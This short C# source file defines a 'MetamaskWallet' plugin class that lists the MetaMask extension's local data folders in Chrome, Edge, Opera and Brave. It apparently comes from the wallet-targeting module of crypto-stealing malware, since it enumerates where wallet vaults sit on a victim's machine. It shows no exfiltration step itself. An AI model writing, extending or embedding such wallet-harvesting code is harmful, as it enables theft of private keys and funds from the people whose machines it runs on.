using System;
using System.Collections.Generic;
using System.IO;

namespace Plugin.Crypto
{
    public class MetamaskWallet : CryptoWalletBase
    {
        public MetamaskWallet()
        {
            walletName = "Metamask";
            
            // Metamask extension data in different browsers
            walletPaths.Add("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn");
            walletPaths.Add("%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn");
            walletPaths.Add("%APPDATA%\\Opera Software\\Opera Stable\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn");
            walletPaths.Add("%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn");
        }
    }
}
